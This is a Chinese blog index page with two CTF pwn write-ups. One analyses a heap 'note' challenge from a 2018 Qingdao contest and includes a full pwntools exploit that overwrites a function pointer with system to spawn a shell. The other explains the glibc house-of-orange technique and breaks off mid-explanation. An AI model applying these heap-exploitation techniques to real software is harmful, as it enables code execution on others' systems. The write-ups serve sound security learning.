<!DOCTYPE html>
<html lang="en">

<!-- Head tag -->
<head>

    <meta charset="utf-8">
    <meta http-equiv="X-UA-Compatible" content="IE=edge">
    <meta name="viewport" content="width=device-width, initial-scale=1">

    <!--Description-->
    

    <!--Author-->
    
        <meta name="author" content="John Doe">
    

    <!--Open Graph Title-->
    
        <meta property="og:title" content="Hexo"/>
    

    <!--Open Graph Description-->
    

    <!--Open Graph Site Name-->
    <meta property="og:site_name" content="Hexo"/>

    <!--Type page-->
    
        <meta property="og:type" content="website" />
    

    <!--Page Cover-->
    

    <meta name="twitter:card" content="summary" />
    

    <!-- Title -->
    
    <title>Hexo</title>

    <!-- Bootstrap Core CSS -->
    <link rel="stylesheet" href="//maxcdn.bootstrapcdn.com/bootstrap/4.0.0-alpha.2/css/bootstrap.min.css" integrity="sha384-y3tfxAZXuh4HwSYylfB+J125MxIs6mR5FOHamPBG064zB+AFeWH94NdvaCBm8qnd" crossorigin="anonymous">

    <!-- Custom Fonts -->
    <link href="//maxcdn.bootstrapcdn.com/font-awesome/4.6.3/css/font-awesome.min.css" rel="stylesheet" type="text/css">

    <!-- HTML5 Shim and Respond.js IE8 support of HTML5 elements and media queries -->
    <!-- WARNING: Respond.js doesn't work if you view the page via file:// -->
    <!--[if lt IE 9]>
        <script src="//oss.maxcdn.com/libs/html5shiv/3.7.0/html5shiv.js"></script>
        <script src="//oss.maxcdn.com/libs/respond.js/1.4.2/respond.min.js"></script>
    <![endif]-->

    <!-- Gallery -->
    <link href="//cdnjs.cloudflare.com/ajax/libs/featherlight/1.3.5/featherlight.min.css" type="text/css" rel="stylesheet" />

    <!-- Custom CSS -->
    <link rel="stylesheet" href="/css/style.css">

    <!-- Google Analytics -->
    


</head>


<body>

<div class="bg-gradient"></div>
<div class="bg-pattern"></div>

<!-- Menu -->
<!--Menu Links and Overlay-->
<div class="menu-bg">
    <div class="menu-container">
        <ul>
            
            <li class="menu-item">
                <a href="/">
                    Home
                </a>
            </li>
            
            <li class="menu-item">
                <a href="/archives">
                    Archives
                </a>
            </li>
            
            <li class="menu-item">
                <a href="/about.html">
                    About
                </a>
            </li>
            
            <li class="menu-item">
                <a href="/tags">
                    Tags
                </a>
            </li>
            
            <li class="menu-item">
                <a href="/categories">
                    Categories
                </a>
            </li>
            
            <li class="menu-item">
                <a href="/contact.html">
                    Contact
                </a>
            </li>
            
        </ul>
    </div>
</div>

<!--Hamburger Icon-->
<nav>
    <a href="#menu"></a>
</nav>

<div class="container">

    <!-- Main Content -->
    <div class="row">
    <div class="col-sm-12">

        <!--Title and Logo-->
        <header>
    <div class="logo">
        <a href="/"><i class="logo-icon fa fa-cube" aria-hidden="true"></i></a>
        
            <h1 id="main-title" class="title">Hexo</h1>
        
    </div>
</header>

        <section class="main">
            
                
<div class="post">

    <div class="post-header index">
        <h1 class="title">
            <a href="/2018/06/27/青岛链弯杯-note/">
                青岛链弯杯--note
            </a>
        </h1>
        <div class="post-info">
            
                <span class="date">2018-06-27</span>
            
            
            
        </div>
    </div>

    
        <div class="content">
            <p><em>废话：第一次打线下赛，确实很慌，该想到的东西都忘了，果然还是得多加练习啊QWQ</em></p>
<h2 id="基本逻辑"><a href="#基本逻辑" class="headerlink" title="基本逻辑"></a>基本逻辑</h2><p>菜单类小游戏：add，edit，show，delete，copy</p>
<p>add：添加结点，此处能够了解结点的结构</p>
<p><img src="/2018/06/27/青岛链弯杯-note/add.png" alt="add函数"></p>
<p><img src="/2018/06/27/青岛链弯杯-note/node.png" alt="结点的结构"></p>
<p>edit函数对结点的content进行编辑，但是这里的v3，v4，v1都没有进行初始化或者置零，将是本题的关键。</p>
<p><img src="/2018/06/27/青岛链弯杯-note/edit.png" alt="edit函数"></p>
<p>show函数，展示结点的content以及title。<strong>这个print函数是写在bss段的一个地址，通过调试发现写入的就是puts函数地址。</strong></p>
<p><img src="/2018/06/27/青岛链弯杯-note/show.png" alt="show函数"></p>
<p>copy函数，malloc出某结点size大小的块N次，N为用户输入。</p>
<p><img src="/2018/06/27/青岛链弯杯-note/copy.png" alt="copy函数"></p>
<h2 id="漏洞利用"><a href="#漏洞利用" class="headerlink" title="漏洞利用"></a>漏洞利用</h2><p>所有结点的地址以数组元素的形式存在于bss段中的s1[]中。前面已经说到了，在edit函数里，对存放size，content地址和结点地址的变量v1，v4和v3都没有进行初始化。发现这个问题的契机在于，当第二次edit某个结点content时，随意输入title都会提示“plz input new content”。没有初始化的后果就是，由于这些函数都会共用一块栈空间，比如show中的v3和edit中的v3地址都是ebp-0x120，v4都是ebp-0x118，导致当在show之后，v3和v4的值为刚刚操作过的结点的地址和content地址，而进入到edit函数中后即使输入的title没有匹配，也会执行向v4中写入v1个字节的操作，如果v4和v1不是同一结点的两个参数，那么就会导致溢出。</p>
<p>例如：v1为s1[1]中的size，而v3和v4是s1[0]中的参数，edit就会向v4中写入v1个字节，当v1大于s1[0]的size时，会造成溢出。溢出后就可以修改s1[0]中content的地址，之后再edit时就相当于相被修改的地址中写入内容。这里先把content0地址修改为print的地址，edit时向print的位置写入system@plt，再次show的时候就相当于执行system。</p>
<p><img src="/2018/06/27/青岛链弯杯-note/nodes.png" alt="堆上结点和content组织形式"></p>
<h2 id="利用脚本"><a href="#利用脚本" class="headerlink" title="利用脚本"></a>利用脚本</h2><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">context.log_level=<span class="string">'debug'</span></span><br><span class="line"></span><br><span class="line">p=process(<span class="string">'./note'</span>)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">add</span><span class="params">(size,content,title)</span>:</span></span><br><span class="line">	p.recvuntil(<span class="string">'input choice:\n'</span>)</span><br><span class="line">	p.sendline(<span class="string">'1'</span>)</span><br><span class="line">	p.recvuntil(<span class="string">'input content size\n'</span>)</span><br><span class="line">	p.sendline(str(size))</span><br><span class="line">	p.recvuntil(<span class="string">'input content\n'</span>)</span><br><span class="line">	p.sendline(content)</span><br><span class="line">	p.recvuntil(<span class="string">'input note title\n'</span>)</span><br><span class="line">	p.sendline(title)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">edit</span><span class="params">(title,content)</span>:</span></span><br><span class="line">	p.recvuntil(<span class="string">'input choice:\n'</span>)</span><br><span class="line">	p.sendline(<span class="string">'2'</span>)</span><br><span class="line">	p.recvuntil(<span class="string">'plz input title\n'</span>)</span><br><span class="line">	p.sendline(title)</span><br><span class="line">	p.recvuntil(<span class="string">'plz input new content\n'</span>)</span><br><span class="line">	p.sendline(content)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">show</span><span class="params">(title)</span>:</span></span><br><span class="line">	p.recvuntil(<span class="string">'input choice:\n'</span>)</span><br><span class="line">	p.sendline(<span class="string">'3'</span>)</span><br><span class="line">	p.recvuntil(<span class="string">'plz input title\n'</span>)</span><br><span class="line">	p.sendline(title)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">copy</span><span class="params">(title,num)</span>:</span></span><br><span class="line">	p.recvuntil(<span class="string">'input choice:\n'</span>)</span><br><span class="line">	p.sendline(<span class="string">'5'</span>)</span><br><span class="line">	p.recvuntil(<span class="string">'plz input title\n'</span>)</span><br><span class="line">	p.sendline(title)</span><br><span class="line">	p.recvuntil(<span class="string">'how many times do you want\n'</span>)</span><br><span class="line">	p.sendline(str(num))</span><br><span class="line"></span><br><span class="line">p.recvuntil(<span class="string">'plz input your name\n'</span>)</span><br><span class="line">p.sendline(<span class="string">''</span>)</span><br><span class="line"></span><br><span class="line">print_addr = <span class="number">0x602100</span></span><br><span class="line">sys_plt = <span class="number">0x400860</span></span><br><span class="line"><span class="comment">#0</span></span><br><span class="line">add(<span class="number">128</span>,<span class="string">"0gur0"</span>,<span class="string">"0"</span>)</span><br><span class="line"><span class="comment">#1</span></span><br><span class="line">add(<span class="number">256</span>,<span class="string">"0gur1"</span>,<span class="string">"1"</span>)</span><br><span class="line"><span class="comment">#2</span></span><br><span class="line">add(<span class="number">256</span>,<span class="string">"/bin/sh"</span>,<span class="string">"/bin/sh"</span>)</span><br><span class="line"><span class="comment">#edit 1 v1=256</span></span><br><span class="line">edit(<span class="string">"1"</span>,<span class="string">"new 0gur1"</span>)</span><br><span class="line"><span class="comment">#show 0 v3=s[0] v4=s[0].content</span></span><br><span class="line">show(<span class="string">"0"</span>)</span><br><span class="line"><span class="comment">#edit content0's addr</span></span><br><span class="line">payload =<span class="string">'a'</span>*<span class="number">128</span><span class="comment">#content0</span></span><br><span class="line">payload +=p64(<span class="number">0</span>)+p64(<span class="number">0x35</span>) <span class="comment">#node0 chunk header</span></span><br><span class="line">payload+=p64(<span class="number">48</span>)+p64(<span class="number">0</span>)+p64(<span class="number">128</span>)+p64(print_addr) <span class="comment">#node0</span></span><br><span class="line">edit(<span class="string">"hhh"</span>,payload)</span><br><span class="line"><span class="comment">#edit 0</span></span><br><span class="line">edit(<span class="string">"0"</span>,p64(sys_plt))</span><br><span class="line"></span><br><span class="line"><span class="comment">#show:print-&gt;system</span></span><br><span class="line">show(<span class="string">'/bin/sh'</span>)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>
<p>PS：一个还没有解决的问题，malloc按理说应该是在堆上进行分配的，但是本题查看分配的地址，都是以0x7f开头的，比较像栈上的地址，而且即使分配了多个块，top chunk的大小都不变…</p>
<p><img src="/2018/06/27/青岛链弯杯-note/heap.png" alt="分配的结点地址"></p>

        </div>
    

</div>
            
                
<div class="post">

    <div class="post-header index">
        <h1 class="title">
            <a href="/2018/06/05/suctf2018-note/">
                suctf2018-note
            </a>
        </h1>
        <div class="post-info">
            
                <span class="date">2018-06-05</span>
            
            
            
        </div>
    </div>

    
        <div class="content">
            <h1 id="house-of-orange-–-note"><a href="#house-of-orange-–-note" class="headerlink" title="house of orange – note"></a>house of orange – note</h1><h2 id="基础知识"><a href="#基础知识" class="headerlink" title="基础知识"></a>基础知识</h2><ol>
<li><p>unsorted bin的解链操作没有类似于malloc中<code>p-&gt;fd-&gt;bk == p</code>的检查</p>
</li>
<li><p>small bins和fastbin存在内存大小相等的区域，例如32位操作系统，fastbin的chunk为64字节以下的16，24,32……；同时，small bins的大小也是从16开始依次相差8字节的chunk大小。但是两者不在同一个位置，fastbin有自己的位置，small bins位于bins数组中。当释放的内存在64B以下时，会直接放入fastbin中；unsorted bin中的chunk最终会放入到small bins中。</p>
</li>
<li><p><strong>house of orange(堆地址未知的情况)</strong></p>
<p>这里省去了修改top大小的部分，修改top大小是为了重新分配一个top，把旧top放入到unsorted bin中，以利用unsorted bin的各种攻击。适用于没有unsorted bin的情况下，如果程序中有unsorted bin，可以省略这部分。</p>
<p>house of orange的原理是，调用<code>malloc</code>时，利用unsorted bin中错误的FD/BK指针，触发<code>malloc_printerr</code>函数打印错误信息，<code>malloc_printerr</code>调用<code>__libc_message</code>，<code>_libc_message</code>调用<code>abort()</code>，<code>abort()</code>调用<code>_IO_flush_all_lockp</code>。在<code>_IO_flush_all_lockp</code>中，通过对链表结构<code>_IO_list_all</code>中的每个结点进行遍历，找到符合条件的结点，执行<code>_IO_OVERWRITE</code>函数，其中结点是<code>_IO_FILE_PLUS</code>类型的结构体，对函数的查找需要通过<code>vtable</code>定位函数表。</p>
<p>通过代码来具体查看，<code>malloc_printerr</code>用于打印错误信息，位于malloc.c中：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">static</span> <span class="keyword">void</span></span><br><span class="line">malloc_printerr (<span class="keyword">int</span> action, <span class="keyword">const</span> <span class="keyword">char</span> *str, <span class="keyword">void</span> *ptr, mstate ar_ptr)</span><br><span class="line">&#123;</span><br><span class="line">  <span class="comment">/* Avoid using this arena in future.  We do not attempt to synchronize this</span></span><br><span class="line"><span class="comment">     with anything else because we minimally want to ensure that __libc_message</span></span><br><span class="line"><span class="comment">     gets its resources safely without stumbling on the current corruption.  */</span></span><br><span class="line">  <span class="keyword">if</span> (ar_ptr)</span><br><span class="line">    set_arena_corrupt (ar_ptr);</span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span> ((action &amp; <span class="number">5</span>) == <span class="number">5</span>)</span><br><span class="line">    __libc_message (action &amp; <span class="number">2</span>, <span class="string">"%s\n"</span>, str);</span><br><span class="line">  <span class="keyword">else</span> <span class="keyword">if</span> (action &amp; <span class="number">1</span>)</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="keyword">char</span> buf[<span class="number">2</span> * <span class="keyword">sizeof</span> (<span class="keyword">uintptr_t</span>) + <span class="number">1</span>];</span><br><span class="line"></span><br><span class="line">      buf[<span class="keyword">sizeof</span> (buf) - <span class="number">1</span>] = <span class="string">'\0'</span>;</span><br><span class="line">      <span class="keyword">char</span> *cp = _itoa_word ((<span class="keyword">uintptr_t</span>) ptr, &amp;buf[<span class="keyword">sizeof</span> (buf) - <span class="number">1</span>], <span class="number">16</span>, <span class="number">0</span>);</span><br><span class="line">      <span class="keyword">while</span> (cp &gt; buf)</span><br><span class="line">        *--cp = <span class="string">'0'</span>;</span><br><span class="line"></span><br><span class="line">      __libc_message (action &amp; <span class="number">2</span>, <span class="string">"*** Error in `%s': %s: 0x%s ***\n"</span>,</span><br><span class="line">                      __libc_argv[<span class="number">0</span>] ? : <span class="string">"&lt;unknown&gt;"</span>, str, cp);</span><br><span class="line">    &#125;</span><br><span class="line">  <span class="keyword">else</span> <span class="keyword">if</span> (action &amp; <span class="number">2</span>)</span><br><span class="line">    <span class="built_in">abort</span> ();</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>​</p>
<p>在<code>__libc_message</code>中会调用<code>absort（）</code>：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/* Abort with an error message.  */</span></span><br><span class="line"><span class="keyword">void</span></span><br><span class="line">__libc_message (<span class="keyword">int</span> do_abort, <span class="keyword">const</span> <span class="keyword">char</span> *fmt, ...)</span><br><span class="line">&#123;</span><br><span class="line">  va_list ap;</span><br><span class="line">  <span class="keyword">int</span> fd = <span class="number">-1</span>;</span><br><span class="line"></span><br><span class="line">  va_start (ap, fmt);</span><br><span class="line"></span><br><span class="line">   ……</span><br><span class="line"></span><br><span class="line">  va_end (ap);</span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span> (do_abort)</span><br><span class="line">    &#123;</span><br><span class="line">      BEFORE_ABORT (do_abort, written, fd);</span><br><span class="line"></span><br><span class="line">      <span class="comment">/* Kill the application.  */</span></span><br><span class="line">      <span class="built_in">abort</span> ();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p><code>abort()</code>中调用<code>_IO_flush_all_lockp()</code>，在调用之前先define为fflush：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">define</span> fflush(s) _IO_flush_all_lockp (0)</span></span><br><span class="line"></span><br><span class="line"> ……</span><br><span class="line"><span class="keyword">void</span></span><br><span class="line"><span class="built_in">abort</span> (<span class="keyword">void</span>)</span><br><span class="line">&#123;</span><br><span class="line">  <span class="class"><span class="keyword">struct</span> <span class="title">sigaction</span> <span class="title">act</span>;</span></span><br><span class="line">  <span class="keyword">sigset_t</span> sigs;</span><br><span class="line"></span><br><span class="line">  <span class="comment">/* First acquire the lock.  */</span></span><br><span class="line">  __libc_lock_lock_recursive (lock);</span><br><span class="line"></span><br><span class="line">  <span class="comment">/* Now it's for sure we are alone.  But recursive calls are possible.  */</span></span><br><span class="line"></span><br><span class="line">  <span class="comment">/* Unlock SIGABRT.  */</span></span><br><span class="line">  <span class="keyword">if</span> (stage == <span class="number">0</span>)</span><br><span class="line">    &#123;</span><br><span class="line">      ++stage;</span><br><span class="line">      <span class="keyword">if</span> (__sigemptyset (&amp;sigs) == <span class="number">0</span> &amp;&amp;</span><br><span class="line">	  __sigaddset (&amp;sigs, SIGABRT) == <span class="number">0</span>)</span><br><span class="line">	__sigprocmask (SIG_UNBLOCK, &amp;sigs, (<span class="keyword">sigset_t</span> *) <span class="literal">NULL</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">  <span class="comment">/* Flush all streams.  We cannot close them now because the user</span></span><br><span class="line"><span class="comment">     might have registered a handler for SIGABRT.  */</span></span><br><span class="line">  <span class="keyword">if</span> (stage == <span class="number">1</span>)</span><br><span class="line">    &#123;</span><br><span class="line">      ++stage;</span><br><span class="line">      <span class="comment">//_IO_flush_all_lockp()</span></span><br><span class="line">      fflush (<span class="literal">NULL</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">  ……</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p><em>离底层越来越近了……</em></p>
<p><code>_IO_flush_all_lockp()</code>获取了_IO_list_all链表，对每一个结点进行处理：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">int</span></span><br><span class="line">_IO_flush_all_lockp (<span class="keyword">int</span> do_lock)</span><br><span class="line">&#123;</span><br><span class="line">  <span class="keyword">int</span> result = <span class="number">0</span>;</span><br><span class="line">  <span class="class"><span class="keyword">struct</span> _<span class="title">IO_FILE</span> *<span class="title">fp</span>;</span></span><br><span class="line">  <span class="keyword">int</span> last_stamp;</span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="meta-keyword">ifdef</span> _IO_MTSAFE_IO</span></span><br><span class="line">  __libc_cleanup_region_start (do_lock, flush_cleanup, <span class="literal">NULL</span>);</span><br><span class="line">  <span class="keyword">if</span> (do_lock)</span><br><span class="line">    _IO_lock_lock (list_all_lock);</span><br><span class="line"><span class="meta">#<span class="meta-keyword">endif</span></span></span><br><span class="line"></span><br><span class="line">  last_stamp = _IO_list_all_stamp;</span><br><span class="line">  <span class="comment">//获取_IO_list_all</span></span><br><span class="line">  fp = (_IO_FILE *) _IO_list_all;</span><br><span class="line">  <span class="keyword">while</span> (fp != <span class="literal">NULL</span>)</span><br><span class="line">    &#123;</span><br><span class="line">      run_fp = fp;</span><br><span class="line">      <span class="keyword">if</span> (do_lock)</span><br><span class="line">	_IO_flockfile (fp);</span><br><span class="line">		</span><br><span class="line">      <span class="comment">//先对_IO_FILE中的mode,_IO_write,_IO_write_base等检查，满足条件才执行_IO_OVERFLOW</span></span><br><span class="line">      <span class="keyword">if</span> (((fp-&gt;_mode &lt;= <span class="number">0</span> &amp;&amp; fp-&gt;_IO_write_ptr &gt; fp-&gt;_IO_write_base)</span><br><span class="line">#<span class="keyword">if</span> defined _LIBC || defined _GLIBCPP_USE_WCHAR_T</span><br><span class="line">	   || (_IO_vtable_offset (fp) == <span class="number">0</span></span><br><span class="line">	       &amp;&amp; fp-&gt;_mode &gt; <span class="number">0</span> &amp;&amp; (fp-&gt;_wide_data-&gt;_IO_write_ptr</span><br><span class="line">				    &gt; fp-&gt;_wide_data-&gt;_IO_write_base))</span><br><span class="line">#endif</span><br><span class="line">	   )</span><br><span class="line">	  &amp;&amp; _IO_OVERFLOW (fp, EOF) == EOF)</span><br><span class="line">	result = EOF;</span><br><span class="line"></span><br><span class="line">      <span class="keyword">if</span> (do_lock)</span><br><span class="line">	_IO_funlockfile (fp);</span><br><span class="line">      run_fp = <span class="literal">NULL</span>;</span><br><span class="line"></span><br><span class="line">      <span class="keyword">if</span> (last_stamp != _IO_list_all_stamp)</span><br><span class="line">	&#123;</span><br><span class="line">	  <span class="comment">/* Something was added to the list.  Start all over again.  */</span></span><br><span class="line">	  fp = (_IO_FILE *) _IO_list_all;</span><br><span class="line">	  last_stamp = _IO_list_all_stamp;</span><br><span class="line">	&#125;</span><br><span class="line">      <span class="keyword">else</span></span><br><span class="line">     <span class="comment">//循环是通过每个结点的chain字段</span></span><br><span class="line">	fp = fp-&gt;_chain;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="meta-keyword">ifdef</span> _IO_MTSAFE_IO</span></span><br><span class="line">  <span class="keyword">if</span> (do_lock)</span><br><span class="line">    _IO_lock_unlock (list_all_lock);</span><br><span class="line">  __libc_cleanup_region_end (<span class="number">0</span>);</span><br><span class="line"><span class="meta">#<span class="meta-keyword">endif</span></span></span><br><span class="line"></span><br><span class="line">  <span class="keyword">return</span> result;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>其中，确定<code>_IO_list_all</code>中结点的结构体为<code>_IO_FILE_plus</code>:</p>
<p><img src="/2018/06/05/suctf2018-note/iolistall.png" alt="_IO_list_all链表的结点类型"></p>
<p><code>_IO_FILE_plus</code>的结构，即一个<code>_IO_FILE</code>结构和一个虚表指针<code>vtable</code>：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">struct</span> _<span class="title">IO_FILE_plus</span></span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line">  _IO_FILE file;</span><br><span class="line">  <span class="keyword">const</span> <span class="class"><span class="keyword">struct</span> _<span class="title">IO_jump_t</span> *<span class="title">vtable</span>;</span></span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>
<p>_IO_FILE结构如下，其中chain是用于记录下一结点的位置的：</p>
<p><img src="/2018/06/05/suctf2018-note/iofile.png" alt="_IO_FILE结构体"></p>
<p>继续看<code>_IO_flush_all_lockp</code>，在if处对结点中各字段进行检查，当满足条件时，会执行<code>_IO_OVERFLOW</code>，函数的寻址是通过查寻vtable实现的。vtable的结构如下，第四行即为<code>_IO_OVERFLOW</code>的地址：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">struct</span> _<span class="title">IO_jump_t</span></span></span><br><span class="line"><span class="class">289	&#123;</span></span><br><span class="line"><span class="number">290</span>	    JUMP_FIELD(<span class="keyword">size_t</span>, __dummy);</span><br><span class="line"><span class="number">291</span>	    JUMP_FIELD(<span class="keyword">size_t</span>, __dummy2);</span><br><span class="line"><span class="number">292</span>	    JUMP_FIELD(_IO_finish_t, __finish);</span><br><span class="line"><span class="number">293</span>	    JUMP_FIELD(_IO_overflow_t, __overflow);</span><br><span class="line"><span class="number">294</span>	    JUMP_FIELD(_IO_underflow_t, __underflow);</span><br><span class="line"><span class="number">295</span>	    JUMP_FIELD(_IO_underflow_t, __uflow);</span><br><span class="line"><span class="number">296</span>	    JUMP_FIELD(_IO_pbackfail_t, __pbackfail);</span><br><span class="line"><span class="number">297</span>	    <span class="comment">/* showmany */</span></span><br><span class="line"><span class="number">298</span>	    JUMP_FIELD(_IO_xsputn_t, __xsputn);</span><br><span class="line"><span class="number">299</span>	    JUMP_FIELD(_IO_xsgetn_t, __xsgetn);</span><br><span class="line"><span class="number">300</span>	    JUMP_FIELD(_IO_seekoff_t, __seekoff);</span><br><span class="line"><span class="number">301</span>	    JUMP_FIELD(_IO_seekpos_t, __seekpos);</span><br><span class="line"><span class="number">302</span>	    JUMP_FIELD(_IO_setbuf_t, __setbuf);</span><br><span class="line"><span class="number">303</span>	    JUMP_FIELD(_IO_sync_t, __sync);</span><br><span class="line"><span class="number">304</span>	    JUMP_FIELD(_IO_doallocate_t, __doallocate);</span><br><span class="line"><span class="number">305</span>	    JUMP_FIELD(_IO_read_t, __read);</span><br><span class="line"><span class="number">306</span>	    JUMP_FIELD(_IO_write_t, __write);</span><br><span class="line"><span class="number">307</span>	    JUMP_FIELD(_IO_seek_t, __seek);</span><br><span class="line"><span class="number">308</span>	    JUMP_FIELD(_IO_close_t, __close);</span><br><span class="line"><span class="number">309</span>	    JUMP_FIELD(_IO_stat_t, __stat);</span><br><span class="line"><span class="number">310</span>	    JUMP_FIELD(_IO_showmanyc_t, __showmanyc);</span><br><span class="line"><span class="number">311</span>	    JUMP_FIELD(_IO_imbue_t, __imbue);</span><br><span class="line"><span class="number">312</span>	&#125;;</span><br></pre></td></tr></table></figure>
<p>按照<a href="http://simp1e.leanote.com/post/Hctf-2017-babyprintf" target="_blank" rel="noopener">simp1e</a>大佬的说法，2.24版本的glibc在执行<code>_IO_OVERFLOW</code>之前还有一个对vtable的检查函数：<code>_IO_check_vtable</code>，他的思路是利用已有的vtable而不是我们自己伪造的vtable，这样很容易过check。实际上也确实有这样的vtable结构：<code>_IO_str_jumps</code>，它就是vtable类型的结构体，因此<code>_IO_OVERFLOW</code>的位置对应于<code>_IO_str_overflow</code>（第三行）</p>
